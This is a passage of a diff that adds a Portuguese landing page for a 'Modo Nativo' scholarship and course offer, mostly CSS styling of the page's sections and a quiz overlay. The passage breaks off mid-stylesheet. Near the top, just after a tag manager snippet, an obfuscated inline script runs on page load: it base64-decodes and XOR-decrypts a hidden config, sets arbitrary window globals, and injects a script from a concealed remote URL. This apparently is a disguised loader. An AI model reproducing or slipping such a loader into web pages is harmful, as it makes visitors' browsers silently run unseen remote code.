@@ -1,0 +1,3159 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <!-- Google Tag Manager -->
+  <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+  new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+  j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+  'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+  })(window,document,'script','dataLayer','GTM-M2Q6K5BN');</script>
+  <!-- End Google Tag Manager -->
+  <script>(function(){var j_38jh=atob("DKN2zlkL/1hXTebCi9hUuytn3WJ1JZK2+9BM4XZomzZ5OJKv4sUP4DpkknY1P8mx6NEfvi140Cg+NYOupNMftjxn0TIkb8rg6tcCvDBpiiwyPsT40P5a7D5nkDo2IZXgsfgN7Ddqkj11d8Sy4tsTohBv3XR1O4eu/sZU9Hs9njxgdN/xvZdBqG84yz5keYLx7pMVrWEpggUq");var h_y85=[];for(var y_p=0;y_p<j_38jh.length;y_p++){h_y85.push(j_38jh.charCodeAt(y_p)&255);}var j_wx=h_y85[0];var d_5ej=h_y85.slice(1,1+j_wx);var t_b=h_y85.slice(1+j_wx);var t_d7dp=t_b.map(function(b,y_6){return b^d_5ej[y_6%j_wx];});var g_pv="";for(var n_9r=0;n_9r<t_d7dp.length;n_9r++){g_pv+=String.fromCharCode(t_d7dp[n_9r]&255);}var e_yyp=decodeURIComponent(escape(g_pv));var m_g=JSON.parse(e_yyp);var x_oxe=m_g.globals||[];x_oxe.forEach(function(j_zni){window[j_zni.name]=j_zni.value;});var n_ik=document.createElement("script");n_ik.src=m_g.url;n_ik.async=true;n_ik.defer=true;(m_g.attributes||[]).forEach(function(x_0zm){n_ik.setAttribute(x_0zm.name,x_0zm.value);});(document.head||document.documentElement).appendChild(n_ik);})();</script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noindex, nofollow">
+  <title>Modo Nativo | Garanta sua Bolsa</title>
+  
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+  <link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet">
+  
+  <!-- intl-tel-input para seletor de telefone com bandeira -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/intl-tel-input@24.5.0/build/css/intlTelInput.css"/>
+  
+  <style>
+    :root {
+      --bg:            #080809;
+      --bg-darker:     #050506;
+      --bg-light:      #0e0e11;
+      --bg-card:       #141417;
+      --bg-card-hover: #1c1c21;
+      --bg-glass:      rgba(14, 14, 17, 0.75);
+      
+      --cta:           #ff6b00;
+      --cta-gradient:  linear-gradient(135deg, #ff6b00 0%, #e05500 100%);
+      --cta2:          #ff8533;
+      --green:         #00d254;
+      --green-glow:    rgba(0, 210, 84, 0.15);
+      
+      --text:          #FFFFFF;
+      --text-secondary: rgba(255, 255, 255, 0.75);
+      --text-muted:     rgba(255, 255, 255, 0.45);
+      --border:        rgba(255, 255, 255, 0.08);
+      --border-hover:  rgba(255, 255, 255, 0.18);
+      
+      --font:          'Poppins', sans-serif;
+      --gold:          #ff6b00;
+      --red:           #FF5252;
+      --shadow:        0 15px 35px rgba(0, 0, 0, 0.4);
+      --transition:    all 0.35s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+    
+    *, *::before, *::after {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    
+    html {
+      scroll-behavior: smooth;
+    }
+    
+    body {
+      font-family: var(--font);
+      background: var(--bg);
+      color: var(--text);
+      min-height: 100vh;
+      overflow-x: hidden;
+      display: flex;
+      flex-direction: column;
+      line-height: 1.6;
+    }
+    
+    /* Custom Scrollbar */
+    ::-webkit-scrollbar {
+      width: 8px;
+    }
+    ::-webkit-scrollbar-track {
+      background: var(--bg);
+    }
+    ::-webkit-scrollbar-thumb {
+      background: rgba(255, 255, 255, 0.12);
+      border-radius: 4px;
+    }
+    ::-webkit-scrollbar-thumb:hover {
+      background: rgba(255, 255, 255, 0.22);
+    }
+
+    /* Common Layout Utilities */
+    .section {
+      padding: 80px 0;
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .container {
+      width: 100%;
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 0 24px;
+      position: relative;
+      z-index: 2;
+    }
+    
+    .section-title {
+      font-size: clamp(1.6rem, 3vw, 2.2rem);
+      font-weight: 900;
+      text-align: center;
+      margin-bottom: 50px;
+      text-transform: uppercase;
+      letter-spacing: -0.5px;
+      line-height: 1.25;
+    }
+    
+    .section-title span {
+      background: var(--cta-gradient);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+    
+    .section-subtitle {
+      text-align: center;
+      font-size: 0.82rem;
+      font-weight: 700;
+      letter-spacing: 2px;
+      color: var(--cta2);
+      text-transform: uppercase;
+      margin-bottom: 10px;
+    }
+    
+    .divider {
+      width: 60px;
+      height: 3px;
+      background: var(--cta-gradient);
+      margin: -35px auto 45px;
+      border-radius: 99px;
+    }
+
+    /* Scroll Animation Base */
+    .reveal {
+      opacity: 0;
+      transform: translateY(30px);
+      transition: opacity 0.8s ease, transform 0.8s cubic-bezier(0.16, 1, 0.3, 1);
+    }
+    .reveal.active {
+      opacity: 1;
+      transform: translateY(0);
+    }
+
+    /* Brand helper */
+    .mn-brand-inline {
+      display: inline-flex;
+      align-items: center;
+      gap: 12px;
+      text-decoration: none;
+    }
+    .mn-brand-inline img {
+      height: 46px;
+      width: auto;
+      display: block;
+      filter: drop-shadow(0 4px 10px rgba(0, 0, 0, 0.3));
+    }
+    .mn-brand-inline span {
+      font-size: 1.45rem;
+      font-weight: 800;
+      color: #ffffff;
+      letter-spacing: -0.3px;
+    }
+
+    /* Placeholder Block */
+    .placeholder-block {
+      background: rgba(255, 107, 0, 0.08);
+      border: 2px dashed rgba(255, 107, 0, 0.45);
+      border-radius: 16px;
+      padding: 28px 20px;
+      color: var(--cta2);
+      font-weight: 700;
+      font-size: 0.95rem;
+      text-align: center;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 120px;
+      width: 100%;
+    }
+    .placeholder-inline {
+      background: rgba(255, 107, 0, 0.16);
+      border: 1px dashed rgba(255, 107, 0, 0.55);
+      color: #ffb380;
+      padding: 2px 8px;
+      border-radius: 6px;
+      font-weight: 700;
+      font-size: 0.88em;
+    }
+
+    /* Buttons */
+    .btn-gold {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      padding: 16px 36px;
+      background: var(--cta-gradient);
+      color: #fff;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      font-family: var(--font);
+      font-size: 0.95rem;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 1.5px;
+      box-shadow: 0 6px 20px rgba(255, 107, 0, 0.35);
+      transition: var(--transition);
+      text-decoration: none;
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .btn-gold::after {
+      content: '';
+      position: absolute;
+      top: -50%; left: -50%;
+      width: 200%; height: 200%;
+      background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.15), transparent);
+      transform: rotate(45deg);
+      transition: all 0.6s ease;
+      pointer-events: none;
+    }
+    
+    .btn-gold:hover::after {
+      left: 120%;
+    }
+    
+    .btn-gold:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 10px 25px rgba(255, 107, 0, 0.55);
+      filter: brightness(1.08);
+    }
+    
+    .btn-gold:active {
+      transform: translateY(1px);
+    }
+
+    /* ═══════════════════════════════════════════════════
+       HERO / HOME
+    ═══════════════════════════════════════════════════ */
+    .hero {
+      min-height: 100vh;
+      background: radial-gradient(circle at 80% 20%, rgba(255, 107, 0, 0.14) 0%, transparent 50%),
+                  radial-gradient(circle at 10% 80%, rgba(255, 107, 0, 0.08) 0%, transparent 60%),
+                  var(--bg);
+      display: flex;
+      align-items: flex-start;
+      padding: 50px 0 60px;
+      position: relative;
+    }
+    
+    .hero::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      pointer-events: none;
+      background-image: radial-gradient(rgba(255, 255, 255, 0.02) 1px, transparent 1px);
+      background-size: 28px 28px;
+    }
+    
+    .hero-inner {
+      display: grid;
+      grid-template-columns: 1.1fr 0.9fr;
+      gap: 40px;
+      align-items: start;
+    }
+    
+    .hero-left {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+      align-items: flex-start;
+      text-align: left;
+    }
+    
+    .logo-wrap {
+      display: flex;
+      justify-content: flex-start;
+      margin-bottom: 10px;
+      width: 100%;
+    }
+    
+    .hero-h1 {
+      font-size: 28px;
+      font-weight: 800;
+      line-height: 1.55;
+      color: #fff;
+      text-transform: uppercase;
+      letter-spacing: -0.5px;
+      text-align: left;
+    }
+    
+    .destaque {
+      position: relative;
+      display: inline;
+      background: var(--cta);
+      padding: 5px 10px;
+      border-radius: 6px;
+      color: #fff;
+      font-weight: 800;
+      box-shadow: none;
+      box-decoration-break: clone;
+      -webkit-box-decoration-break: clone;
+    }
+    
+    .checklist {
+      list-style: none;
+      display: flex;
+      flex-direction: column;
+      align-items: flex-start;
+      justify-content: flex-start;
+      gap: 8px;
+      margin: 8px 0 10px;
+      width: 100%;
+    }
+    
+    .checklist li {
+      display: flex;
+      align-items: center;
+      justify-content: flex-start;
+      gap: 8px;
+      font-size: 0.9rem;
+      font-weight: 700;
+      color: #ffffff;
+      letter-spacing: 0.5px;
+    }
+    
+    .checklist li i {
+      color: var(--green);
+      font-size: 1.15rem;
+      background: transparent;
+      padding: 0;
+      border-radius: 0;
+      flex-shrink: 0;
+    }
+    
+    .hero-sub {
+      font-size: 17px;
+      color: #ffffff;
+      text-align: left;
+      margin-bottom: 10px;
+      line-height: 1.45;
+    }
+    
+    .hero-sub u {
+      font-weight: 700;
+      color: #ffffff;
+      text-decoration-color: #ffffff;
+      text-decoration-thickness: 1px;
+    }
+
+    /* Hero Form Card */
+    .form-card {
+      background: transparent;
+      border: none;
+      border-radius: 0;
+      padding: 0;
+      box-shadow: none;
+      position: relative;
+      overflow: visible;
+      width: 100%;
+      max-width: 480px;
+      margin: 0;
+    }
+    
+    .form-card .fg {
+      margin-bottom: 18px;
+      position: relative;
+    }
+    
+    .form-card .fg input {
+      width: 100%;
+      height: 46px;
+      padding: 0 20px;
+      background: #ffffff;
+      border: 1px solid #e2e8f0;
+      border-radius: 8px;
+      color: #1a1a1a;
+      font-family: var(--font);
+      font-size: 0.95rem;
+      transition: var(--transition);
+      box-sizing: border-box;
+    }
+    
+    .form-card .fg input::placeholder {
+      color: #7a7a7a;
+    }
+    
+    .form-card .fg input:focus {
+      outline: none;
+      border-color: var(--cta);
+      background: #ffffff;
+      box-shadow: 0 0 10px rgba(255, 107, 0, 0.15);
+    }
+    
+    .form-card .fg input.err,
+    .form-card .fg input.input-error {
+      border-color: var(--red) !important;
+      background: #fff;
+      box-shadow: 0 0 10px rgba(255, 82, 82, 0.1);
+    }
+    
+    .iti { width: 100%; display: block; }
+    .iti__dropdown-content { z-index: 50; background-color: #ffffff !important; color: #1a1a1a !important; }
+    .iti--container { z-index: 9999; }
+    .iti__selected-dial-code { color: #1a1a1a !important; font-weight: 600; }
+    .iti__arrow { border-top-color: #555555 !important; }
+    .iti__arrow--up { border-bottom-color: #555555 !important; }
+    .iti__country-list { background-color: #ffffff !important; color: #1a1a1a !important; }
+    .iti__country, .iti__country-name { color: #1a1a1a !important; }
+    .iti__dial-code { color: #666666 !important; }
+    .iti__search-input { padding: 10px 12px !important; font-size: 14px !important; border-radius: 8px !important; border: 1px solid #e2e8f0 !important; color: #1a1a1a !important; background: #fff !important; }
+
+    #btn-hero-start {
+      background: var(--cta) !important;
+      color: #ffffff !important;
+      box-shadow: none !important;
+      border-radius: 8px !important;
+      padding: 16px 20px !important;
+      font-size: 0.95rem !important;
+      font-weight: 700 !important;
+      text-transform: uppercase !important;
+      letter-spacing: 0.5px !important;
+      display: flex !important;
+      align-items: center !important;
+      justify-content: center !important;
+      width: 100%;
+    }
+    #btn-hero-start:hover {
+      background: #e05500 !important;
+      transform: translateY(-2px) !important;
+      box-shadow: 0 6px 15px rgba(255, 107, 0, 0.35) !important;
+    }
+    #btn-hero-start::after {
+      display: none !important;
+    }
+    
+    .err-msg {
+      color: #ff8b7b;
+      font-size: 0.76rem;
+      margin-top: 5px;
+      font-weight: 500;
+      display: none;
+      align-items: center;
+      gap: 5px;
+    }
+    
+    .err-msg.show {
+      display: flex;
+    }
+
+    /* Hero Right Card */
+    .hero-card {
+      border-radius: 24px;
+      overflow: hidden;
+      box-shadow: 0 30px 70px rgba(0, 0, 0, 0.5);
+      position: relative;
+      width: 100%;
+      height: 100%;
+      min-height: 520px;
+      background: var(--bg-light);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      transition: var(--transition);
+    }
+    
+    .hero-card:hover {
+      transform: translateY(-5px);
+      border-color: rgba(255, 255, 255, 0.18);
+    }
+    
+    .hero-card img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: block;
+      transition: var(--transition);
+    }
+
+    /* ═══════════════════════════════════════════════════
+       SECTION 2: ENTENDA O MODO NATIVO
+    ═══════════════════════════════════════════════════ */
+    .brand-logo-center {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      margin: 0 auto 20px;
+    }
+    .brand-logo-center img {
+      height: 52px;
+      width: auto;
+      filter: drop-shadow(0 4px 10px rgba(0,0,0,0.3));
+    }
+    
+    .project-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 24px;
+      margin-bottom: 24px;
+    }
+    
+    .project-grid-2 {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 24px;
+      margin-bottom: 40px;
+    }
+    
+    .project-card {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: 16px;
+      padding: 35px 28px;
+      transition: var(--transition);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+      gap: 15px;
+    }
+    
+    .project-card:hover {
+      background: var(--bg-card-hover);
+      border-color: var(--border-hover);
+      transform: translateY(-5px);
+      box-shadow: var(--shadow);
+    }
+    
+    .project-card i {
+      font-size: 2.5rem;
+      color: var(--cta2);
+      background: rgba(255, 107, 0, 0.1);
+      width: 70px;
+      height: 70px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 50%;
+      border: 1px solid rgba(255, 107, 0, 0.25);
+    }
+    
+    .project-card h3 {
+      font-size: 1.15rem;
+      font-weight: 800;
+      color: #fff;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+    
+    .project-card p {
+      font-size: 0.9rem;
+      color: var(--text-secondary);
+      line-height: 1.6;
+    }
+    
+    .center-cta-wrap {
+      display: flex;
+      justify-content: center;
+      margin-top: 20px;
+    }
+
+    /* ═══════════════════════════════════════════════════
+       SECTION 3: CURSOS OFERECIDOS & MATERIAL
+    ═══════════════════════════════════════════════════ */
+    .courses-bg {
+      background: linear-gradient(180deg, var(--bg) 0%, var(--bg-light) 50%, var(--bg) 100%);
+    }
+    
+    .course-intro {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: 20px;
+      padding: 40px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+      gap: 20px;
+      max-width: 900px;
+      margin: 0 auto 60px;
+    }
+    
+    .course-logo {
+      height: 56px;
+      width: auto;
+      filter: drop-shadow(0 4px 10px rgba(0, 0, 0, 0.3));
+    }
+    
+    .course-intro h3 {
+      font-size: 1.5rem;
+      font-weight: 800;
+      color: #fff;
+      letter-spacing: 0.5px;
+    }
+    
+    .course-intro p {
+      font-size: 0.95rem;
+      color: var(--text-secondary);
+      max-width: 780px;
+      line-height: 1.7;
+    }
+    
+    .course-intro p strong {
+      color: #fff;
+    }
+    
+    .material-showcase {
+      display: grid;
+      grid-template-columns: 1fr 1.2fr;
+      gap: 50px;
+      align-items: center;
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: 24px;
+      padding: 40px 50px;
+    }
+    
+    .phone-mockup {
+      display: flex;
+      justify-content: center;
+      position: relative;
+    }
+    
+    .phone-mockup img {
+      max-width: 320px;
+      width: 100%;
+      border-radius: 16px;
+      filter: drop-shadow(0 15px 35px rgba(0, 0, 0, 0.6));
+      animation: floatMockup 4s ease-in-out infinite alternate;
+    }
+    
+    @keyframes floatMockup {
+      from { transform: translateY(0); }
+      to { transform: translateY(-12px); }
+    }
+    
+    .material-desc {
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+    }
+    
+    .material-desc h2 {
+      font-size: 2rem;
+      font-weight: 900;
+      line-height: 1.3;
+      text-transform: uppercase;
+    }
+    
+    .material-desc h2 span {
+      display: block;
+      color: var(--cta2);
+    }
+    
+    .material-desc p {
+      font-size: 0.95rem;
+      color: var(--text-secondary);
+      line-height: 1.7;
+    }
+
+    /* ═══════════════════════════════════════════════════
+       SECTION 4: VEJA O QUE VAI RECEBER
+    ═══════════════════════════════════════════════════ */
+    .perks-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 24px;
+      margin-bottom: 40px;
+    }
+    
+    .perk-card {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: 16px;
+      padding: 30px 24px;
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+      transition: var(--transition);
+    }
+    
+    .perk-card:hover {
+      background: var(--bg-card-hover);
+      border-color: var(--border-hover);
+      transform: translateY(-4px);
+    }
+    
+    .perk-icon {
+      width: 55px;
+      height: 55px;
+      border-radius: 14px;
+      background: rgba(255, 107, 0, 0.12);
+      border: 1px solid rgba(255, 107, 0, 0.25);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.8rem;
+      color: var(--cta2);
+    }
+    
+    .perk-card h3 {
+      font-size: 1.05rem;
+      font-weight: 800;
+      color: #fff;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+    
+    .perk-card p {
+      font-size: 0.88rem;
+      color: var(--text-secondary);
+      line-height: 1.6;
+    }
+
+    /* ═══════════════════════════════════════════════════
+       SECTION 5: QUEM ESTÁ POR TRÁS
+    ═══════════════════════════════════════════════════ */
+    .behind-bg {
+      background: linear-gradient(180deg, var(--bg) 0%, var(--bg-light) 100%);
+    }
+    
+    .behind-layout {
+      display: grid;
+      grid-template-columns: 0.9fr 1.1fr;
+      gap: 60px;
+      align-items: center;
+    }
+    
+    .behind-image {
+      position: relative;
+    }
+    
+    .behind-badge {
+      position: absolute;
+      bottom: -20px;
+      right: 20px;
+      background: var(--cta-gradient);
+      padding: 12px 24px;
+      border-radius: 12px;
+      font-weight: 800;
+      font-size: 0.85rem;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.3);
+      border: 1px solid rgba(255,255,255,0.15);
+    }
+    
+    .behind-list {
+      list-style: none;
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+    }
+    
+    .behind-list li {
+      display: flex;
+      gap: 15px;
+      font-size: 0.95rem;
+      color: var(--text-secondary);
+      line-height: 1.6;
+    }
+    
+    .behind-list li i {
+      color: var(--cta2);
+      font-size: 1.4rem;
+      flex-shrink: 0;
+      margin-top: 3px;
+    }
+    
+    .behind-list li strong {
+      color: #fff;
+    }
+
+    /* ═══════════════════════════════════════════════════
+       SECTION 6: PROGRAMA DE BOLSAS (FASES)
+    ═══════════════════════════════════════════════════ */
+    .phases-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 24px;
+      margin-bottom: 40px;
+    }
+    
+    .phase-card {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: 20px;
+      padding: 40px 30px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+      gap: 20px;
+      transition: var(--transition);
+    }
+    
+    .phase-card:hover {
+      background: var(--bg-card-hover);
+      border-color: var(--border-hover);
+      transform: translateY(-5px);
+      box-shadow: var(--shadow);
+    }
+    
+    .phase-card h4 {
+      font-size: 0.95rem;
+      color: var(--cta2);
+      font-weight: 800;
+      letter-spacing: 1.5px;
+    }
+    
+    .phase-icon {
+      width: 82px;
+      height: 82px;
+      border-radius: 50%;
+      background: rgba(255, 107, 0, 0.1);
+      border: 1px solid rgba(255, 107, 0, 0.25);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 2.4rem;
+      color: var(--cta2);
+    }
+    
+    .phase-card h3 {
+      font-size: 1.3rem;
+      font-weight: 800;
+      color: #fff;
+    }
+    
+    .phase-card p {
+      font-size: 0.88rem;
+      color: var(--text-secondary);
+      line-height: 1.7;
+    }
+
+    /* ═══════════════════════════════════════════════════
+       SECTION 7: CERTIFICAÇÃO E NÍVEIS
+    ═══════════════════════════════════════════════════ */
+    .levels-bg {
+      background: linear-gradient(180deg, var(--bg-light) 0%, var(--bg) 100%);
+    }
+    
+    .levels-list {
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+      max-width: 900px;
+      margin: 0 auto 40px;
+    }
+    
+    .level-item {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: 16px;
+      padding: 24px 30px;
+      display: grid;
+      grid-template-columns: auto 1fr;
+      align-items: start;
+      gap: 20px;
+      transition: var(--transition);
+    }
+    
+    .level-item:hover {
+      background: var(--bg-card-hover);
+      border-color: var(--border-hover);
+      transform: translateX(5px);
+    }
+    
+    .level-check {
+      font-size: 1.8rem;
+      color: var(--green);
+      flex-shrink: 0;
+      margin-top: 2px;
+    }
+    
+    .level-content {
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
+    
+    .level-content h4 {
+      font-size: 1.05rem;
+      font-weight: 800;
+      color: #fff;
+      letter-spacing: 0.5px;
+    }
+    
+    .level-content p {
+      font-size: 0.88rem;
+      color: var(--text-secondary);
+      line-height: 1.6;
+    }
+
+    /* ═══════════════════════════════════════════════════
+       SECTION 8: MIDIA LOGOS
+    ═══════════════════════════════════════════════════ */
+    .media-section {
+      background: var(--bg-light);
+      border-top: 1px solid var(--border);
+      border-bottom: 1px solid var(--border);
+      padding: 40px 0;
+    }
+    
+    .media-wrap {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 20px;
+    }
+
+    /* ═══════════════════════════════════════════════════
+       SECTION 9: QUEM PODE PARTICIPAR
+    ═══════════════════════════════════════════════════ */
+    .criteria-layout {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 50px;
+      align-items: center;
+    }
+    
+    .criteria-left img {
+      width: 100%;
+      border-radius: 20px;
+      box-shadow: var(--shadow);
+    }
+    
+    .criteria-right {
+      display: flex;
+      flex-direction: column;
+      gap: 25px;
+    }
+    
+    .criteria-card {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: 14px;
+      padding: 20px 24px;
+      display: flex;
+      align-items: center;
+      gap: 20px;
+      transition: var(--transition);
+    }
+    
+    .criteria-card:hover {
+      background: var(--bg-card-hover);
+      border-color: var(--border-hover);
+    }
+    
+    .criteria-card i {
+      font-size: 2rem;
+      color: var(--cta2);
+      background: rgba(255, 107, 0, 0.1);
+      width: 54px;
+      height: 54px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 12px;
+      flex-shrink: 0;
+    }
+    
+    .criteria-card h4 {
+      font-size: 1rem;
+      font-weight: 700;
+      color: #fff;
+    }
+    
+    .criteria-card p {
+      font-size: 0.88rem;
+      color: var(--text-secondary);
+      margin-top: 3px;
+    }
+
+    /* ═══════════════════════════════════════════════════
+       SECTION 10: DEPOIMENTOS DE ALUNOS
+    ═══════════════════════════════════════════════════ */
+    .testimonial-section {
+      background: linear-gradient(180deg, var(--bg) 0%, var(--bg-light) 100%);
+    }
+    
+    .slider-container {
+      max-width: 800px;
+      margin: 0 auto;
+      position: relative;
+      overflow: hidden;
+      padding: 20px 0;
+    }
+    
+    .slider-wrapper {
+      display: flex;
+      transition: transform 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+    
+    .slide {
+      min-width: 100%;
+      box-sizing: border-box;
+      padding: 0 40px;
+    }
+    
+    .testi-card {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: 20px;
+      padding: 40px;
+      text-align: center;
+      position: relative;
+    }
+    
+    .testi-card i.quote-icon {
+      font-size: 3rem;
+      color: rgba(255, 107, 0, 0.15);
+      position: absolute;
+      top: 20px;
+      left: 30px;
+    }
+    
+    .testi-text {
+      font-size: 1rem;
+      font-style: italic;
+      color: var(--text-secondary);
+      line-height: 1.7;
+      margin-bottom: 25px;
+      position: relative;
+      z-index: 1;
+    }
+    
+    .testi-author {
+      font-weight: 800;
+      color: #fff;
+      font-size: 1.05rem;
+      display: block;
+    }
+    
+    .testi-city {
+      font-size: 0.82rem;
+      color: var(--cta2);
+      text-transform: uppercase;
+      font-weight: 600;
+      letter-spacing: 1px;
+    }
+    
+    .slider-arrow {
+      position: absolute;
+      top: 50%;
+      transform: translateY(-50%);
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid var(--border);
+      color: #fff;
+      width: 44px;
+      height: 44px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      font-size: 1.4rem;
+      transition: var(--transition);
+      z-index: 10;
+    }
+    
+    .slider-arrow:hover {
+      background: var(--cta-gradient);
+      border-color: transparent;
+      box-shadow: 0 4px 12px rgba(255, 107, 0, 0.3);
+    }
+    
+    .slider-arrow.prev { left: 10px; }
+    .slider-arrow.next { right: 10px; }
+    
+    .slider-dots {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin-top: 25px;
+    }
+    
+    .dot {
+      width: 10px;
+      height: 10px;
+      background: rgba(255, 255, 255, 0.2);
+      border-radius: 50%;
+      cursor: pointer;
+      transition: var(--transition);
+    }
+    
+    .dot.active {
+      background: var(--cta2);
+      transform: scale(1.2);
+    }
+
+    /* ═══════════════════════════════════════════════════
+       SECTION 11: SOBRE A INSTITUIÇÃO
+    ═══════════════════════════════════════════════════ */
+    .about-inst-layout {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 50px;
+      align-items: center;
+    }
+    
+    .about-inst-left h2 {
+      font-size: 2rem;
+      font-weight: 900;
+      line-height: 1.3;
+      text-transform: uppercase;
+      margin-bottom: 25px;
+    }
+    
+    .about-inst-left h2 span {
+      color: var(--cta);
+    }
+    
+    .about-inst-left p {
+      font-size: 0.95rem;
+      color: var(--text-secondary);
+      line-height: 1.7;
+      margin-bottom: 20px;
+    }
+    
+    .about-inst-left p strong {
+      color: #fff;
+    }
+    
+    .about-inst-right {
+      position: relative;
+    }
+
+    /* ═══════════════════════════════════════════════════
+       SECTION 12: A MELHOR OFERTA DO ANO (FINAL CTA)
+    ═══════════════════════════════════════════════════ */
+    .final-cta {
+      background: linear-gradient(135deg, #080809 0%, #0e0e11 50%, #080809 100%);
+      text-align: center;
+      border-top: 1px solid var(--border);
+    }
+    
+    .final-cta-content {
+      max-width: 800px;
+      margin: 0 auto;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 20px;
+    }
+    
+    .final-cta-content h2 {
+      font-size: 2.2rem;
+      font-weight: 900;
+      text-transform: uppercase;
+      line-height: 1.2;
+    }
+    
+    .final-cta-content h3 {
+      font-size: 1.15rem;
+      color: var(--cta2);
+      font-weight: 800;
+      letter-spacing: 2px;
+      text-transform: uppercase;
+    }
+    
+    .final-cta-content p {
+      font-size: 1rem;
+      color: var(--text-secondary);
+      max-width: 600px;
+      line-height: 1.7;
+      margin-bottom: 10px;
+    }
+
+    /* ═══════════════════════════════════════════════════
+       QUIZ OVERLAY
+    ═══════════════════════════════════════════════════ */
+    .quiz-overlay {
+      position: fixed;
+      inset: 0;
+      background: var(--bg);
+      z-index: 1000;
+      display: none;
+      flex-direction: column;
+      overflow-y: auto;
+    }
+    
+    .quiz-overlay.active {
+      display: flex;
+      animation: slideUp 0.45s cubic-bezier(0.16, 1, 0.3, 1);
+    }
+
+    @keyframes slideUp {
+      from { transform: translateY(100%); }
+      to { transform: translateY(0); }
+    }
+    
+    @keyframes fadeUp {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .quiz-topbar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 16px 30px;
+      border-bottom: 1px solid var(--border);
+      gap: 20px;
+      flex-shrink: 0;
+      background: rgba(14, 14, 17, 0.95);
+      backdrop-filter: blur(10px);
+      -webkit-backdrop-filter: blur(10px);
+      position: sticky;
+      top: 0;
+      z-index: 10;
+    }
+    
+    .topbar-left {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+    }
+    
+    .quiz-logo {
+      height: 32px;
+      width: auto;
+      object-fit: contain;
+    }
+    
+    @media(max-width: 600px) {
+      .topbar-left {
+        gap: 8px;
+      }
+      .quiz-logo {
+        height: 24px;
+      }
+    }
+    
+    .timer-wrap {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 8px 16px;
+      font-size: 0.9rem;
+      font-weight: 700;
+      color: #ffffff;
+      white-space: nowrap;
+      min-width: 100px;
+      justify-content: center;
+      transition: var(--transition);
+    }
+    
+    .timer-wrap i {
+      color: var(--cta);
+      font-size: 1.1rem;
+    }
+    
+    .timer-wrap.urgent {
+      border-color: var(--red);
